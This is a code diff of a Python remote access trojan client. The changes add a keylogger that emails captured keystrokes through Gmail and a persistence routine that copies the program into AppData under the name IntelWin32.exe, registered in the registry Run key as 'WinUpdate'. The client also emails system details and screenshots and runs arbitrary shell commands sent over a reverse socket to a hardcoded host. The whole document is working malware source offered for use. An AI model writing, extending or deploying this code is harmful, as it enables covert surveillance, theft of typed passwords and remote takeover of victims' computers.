@@ -1,11 +1,11 @@
 import subprocess
 import os
-import shutil
-import sys
 import requests
 import time
 import socket
+import shutil
 import json
+import sys
 import pyscreeze
 import platform
 import ctypes
@@ -13,14 +13,22 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
 import smtplib
-from io import StringIO, BytesIO
+from io import BytesIO
 from cryptography.fernet import Fernet
+from pynput.keyboard import Key, Listener
 
 
-HOST = "192.168.1.37"
+HOST = "192.168.1.35"
 PORT = 6666
 BUFF = 1024
 
+
+def become_persistent():
+    _evil_file_location_ = os.environ["appdata"] + "\\IntelWin32.exe"
+    if not os.path.exists(_evil_file_location_):
+        shutil.copyfile(sys.executable, _evil_file_location_)
+        regedit_command = f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ /d {_evil_file_location_}"
+        subprocess.call(regedit_command, shell=True)
 
 def connect():
     global objSocket, objEncryptor
@@ -90,35 +98,37 @@ def upload(data):
             response = (objFile.read())  # Send Contents of File
     return response
 
-def lock():
-    ctypes.windll.user32.LockWorkStation()
-    response = b"[+] Locked!"
-    return response
 
-def screenshot():
-    img = pyscreeze.screenshot()
-    with BytesIO() as objBytes:
-        # Save Screenshot into BytesIO Object
-        img.save(objBytes, format="PNG")
-        # Get BytesIO Object Data as bytes
-        ss = objBytes.getvalue()
 
-    return ss
+def mail_config(mail="target@gmail.com"):
+    host = "smtp.gmail.com"
+    port = 465
+    val = smtplib.SMTP_SSL(host, port)
+    val.login("sender@gmail.com", "passw0rd!")
+
+    msg = MIMEMultipart()
+    msg['Subject'] = "Client Info"
+    msg['From'] = "sender@gmail.com"
+    msg['To'] = mail
+
+    values = []
+    values.append(val)
+    values.append(msg)
+    return values
+
+
+timeIteration = 20  # 20 secs
+count = 0
+keys = []
+currentTime = time.time()
+stoppingTime = 0
+
 
 def send_info_as_mail(email):
     if email == "":
         return b"[-] Invalid email address!"
     try:
-        host = "smtp.gmail.com"
-        port = 465
-        val = smtplib.SMTP_SSL(host, port)
-        val.login("your@gmail.com", "Passw0rd!")
-
-        msg = MIMEMultipart()
-        msg['Subject'] = "Client Info"
-        msg['From'] = "your@gmail.com"
-        msg['To'] = email
-
+        mail = mail_config(email)
         response = requests.get("https://api.ipify.org?format=json")
         public_ip = response.json()["ip"]
         processor = platform.processor()
@@ -132,19 +142,101 @@ def send_info_as_mail(email):
                                 HOST NAME: {3}
                                 PRIVATE IP:{4}
                                """.format(public_ip, processor, system_info, host_name, private_ip))
-        msg.attach(txt)
-
+        mail[1].attach(txt)
 
         _file = MIMEApplication(screenshot(),  _subtype="png")
-        _file.add_header('Content-Disposition', 'attachment', filename="info.png")
-        msg.attach(_file)
+        _file.add_header('Content-Disposition',
+                         'attachment', filename="info.png")
+        mail_config(email)[1].attach(_file)
 
-        val.send_message(msg)
-        val.quit()
+        mail[0].send_message(mail[1])
+        mail[0].quit()
         return b"[+] Success!"
 
     except Exception as e:
         return f"[-] Error! {e}".encode()
+
+
+def send_keylogs_as_mail():
+
+    if not os.path.isfile("logger.txt"):
+        f = open("logger.txt", "w")
+    mail = mail_config()
+    txt = MIMEText("Log Message")
+    mail[1].attach(txt)
+    with open("logger.txt", "rb") as f:
+        _file = MIMEApplication(f.read(), _subtype="txt")
+    _file.add_header('Content-Disposition',
+                     'attachment', filename="logger.txt")
+    mail[1].attach(_file)
+    mail[0].send_message(mail[1])
+    mail[0].quit()
+
+
+def keylogger():
+    def on_press(key):
+        global currentTime, count, keys
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
+
+    def write_file(keys):
+        with open("logger.txt", "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+    def on_release(key):
+        global currentTime, stoppingTime
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingTime:
+            return False
+
+    global currentTime, stoppingTime, timeIteration
+    while True:
+        with Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+        send_keylogs_as_mail()
+        send(b"[+] Give an order(start/stop).")
+        order = recv(BUFF).decode()
+        print(order)
+        if order == "stop":
+            break
+        elif order == "continue" or order == "start":
+            if currentTime > stoppingTime:
+                with open("logger.txt", 'w') as f:
+                    f.write(" ")
+                currentTime = time.time()
+                stoppingTime = currentTime + timeIteration
+
+
+def lock():
+    ctypes.windll.user32.LockWorkStation()
+    response = b"[+] Locked!"
+    return response
+
+
+def screenshot():
+    img = pyscreeze.screenshot()
+    with BytesIO() as objBytes:
+        # Save Screenshot into BytesIO Object
+        img.save(objBytes, format="PNG")
+        # Get BytesIO Object Data as fbytes
+        ss = objBytes.getvalue()
+
+    return ss
+
 
 def run():
     while True:
@@ -162,7 +254,8 @@ def run():
         elif order[:2] == "cd":
             if os.path.exists(order[3:]):
                 os.chdir(order[3:])
-                bytResponse= f"[+] Changing working directory to {os.getcwd()}>".encode()
+                bytResponse = f"[+] Changing working directory to {os.getcwd()}>".encode(
+                )
             else:
                 bytResponse = "[-] Path not found!".encode()
 
@@ -179,18 +272,27 @@ def run():
             bytResponse = screenshot()
         elif order[:4] == "mail":
             bytResponse = send_info_as_mail(order[5:])
+        elif order == "keylogger":
+            keylogger()
 
         elif len(order) > 0:
-            objCommand = subprocess.Popen(order, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
+            objCommand = subprocess.Popen(
+                order, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             strOutput = objCommand.stdout.read() + objCommand.stderr.read()
             bytResponse = strOutput
 
         else:
-            bytResponse = b"Error!"
+            bytResponse = b"[-] Error!"
 
-        sendall(bytResponse)
+        if not order == "keylogger":
+            sendall(bytResponse)
 
 
-connect()
-send_client_info()
-run()
+def main():
+    become_persistent()
+    connect()
+    send_client_info()
+    run()
+
+
+main()
